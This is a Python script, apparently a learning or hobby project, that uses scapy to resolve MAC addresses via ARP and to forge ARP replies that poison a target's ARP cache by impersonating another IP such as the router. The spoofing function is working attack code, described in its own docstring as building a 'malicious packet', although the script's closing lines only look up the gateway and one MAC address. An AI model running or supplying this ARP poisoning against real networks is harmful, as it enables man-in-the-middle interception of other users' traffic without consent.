import scapy.all as scapy
import argparse 

def get_mac(ip_address):
    """
    This function takes in an IP address and crafts an ARP request packet asking for it's MAC address.
    By wrapping the request in an ethernet broadcasting frame, this request will be seen by all devices on the network
    It will parse the response and return the MAC address
    """

    arp_request = scapy.ARP(pdst=ip_address)

    arp_request_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Combine ARP request and ethernet frame into a single packet
    arp_request_broadcast = arp_request_broadcast/arp_request
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # If answered_list contains pairs of (sent, recieved) packet
    if answered_list:

        # Find MAC adress of first recieved packet
        return answered_list[0][1].hwsrc
    else:
        return None

def send_spoof_packet(target_ip, spoof_ip):
    """
    This function takes two arguments; the ip of the arp poisoning target, and the ip of the device being spoofed.
    First, collect the target_ip's mac adress with the get_mac util function.
    Then, use scapy.ARP() to build the malicious packet. This packet is an "answer"; we are asserting to the network's ARP table the new,
    impersonated mac address which the router thinks is the phone. 
    Finally, send the packet to the network with scapy.send()
    """

    target_mac = get_mac(target_ip)
    print(f"Target mac: {target_mac}")


    # Poison the router ARP cache
    # op = 2; this is an answer, not a request
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send packet to network
    scapy.send(arp_packet, verbose=False)

from scapy.all import conf

# Get default route
default_route = conf.route.route("0.0.0.0")
gateway_ip = default_route[2]
print(f"Router IP: {gateway_ip}")

print(get_mac("10.0.0.1"))